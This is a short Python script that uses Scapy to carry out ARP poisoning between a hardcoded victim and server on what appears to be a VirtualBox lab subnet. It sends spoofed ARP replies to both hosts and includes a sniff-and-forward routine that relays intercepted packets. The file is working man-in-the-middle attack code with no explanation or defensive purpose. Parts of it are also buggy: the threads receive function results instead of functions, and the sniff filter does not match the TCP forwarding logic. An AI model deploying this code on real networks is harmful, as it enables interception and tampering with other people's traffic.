from scapy.all import *
from scapy.layers.inet import IP, TCP
import threading

victimIP = "192.168.56.101"
victimMAC = "08:00:27:b0:a1:ab"

serverIP = "192.168.56.102"
serverMAC = "08:00:27:c6:a4:61"

networkInterface = "enp0s3"
interceptedPkt = []
clients = []


def arpPoisoning(attackerIP, attackerMAC):
    pktV = Ether() / ARP()
    pktV[Ether].src = attackerMAC
    pktV[ARP].hwsrc = attackerMAC
    pktV[ARP].psrc = serverIP
    pktV[ARP].hwdst = victimMAC
    pktV[ARP].pdst = victimIP

    sendp(pktV, iface=networkInterface)

    pktS = Ether() / ARP()
    pktS[Ether].src = attackerMAC
    pktS[ARP].hwsrc = attackerMAC
    pktS[ARP].psrc = victimIP
    pktS[ARP].hwdst = serverMAC
    pktS[ARP].pdst = serverIP

    sendp(pktS, iface=networkInterface)


def arpSniffing(attackerIP, attackerMAC):
    def intercept(pkt):
        interceptedPkt.append(pkt)
        if (pkt.haslayer(TCP) and pkt[Ether].dst == attackerMAC and (
                pkt[IP].dst == serverIP or pkt[IP].dst == victimIP)):
            if pkt[IP].dst == serverIP:
                pkt[Ether].dst = serverMAC
            else:
                pkt[Ether].dst = victimMAC

        pkt[Ether].src = attackerMAC
        sendp(pkt, iface=networkInterface)

    sniff(prn=intercept, iface=networkInterface, filter="arp")
    print("finish")


def arp(attackerIP, attackerMAC):
    poisonThread = threading.Thread(target=arpPoisoning(attackerIP, attackerMAC))
    poisonThread.daemon = True
    poisonThread.start()

    # sniffThread = threading.Thread(target = arpSniffing(attackerIP, attackerMAC))
    # sniffThread.daemon = True
    # sniffThread.start()


def getMAC(victinIP):
    arp = ARP(pdst=victimIP)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pkt = ether / arp
    networkInterface = "enp0s3"

    result = srp(pkt, iface=networkInterface, timeout=2, inter=0.1)[0]

    for sent, received in result:
        clients.append({"ip": received.psrc, "mac": received.hwsrc})


def main():
    attackerIP = get_if_addr(networkInterface)
    attackerMAC = get_if_hwaddr(networkInterface)
    arp(attackerIP, attackerMAC)


main()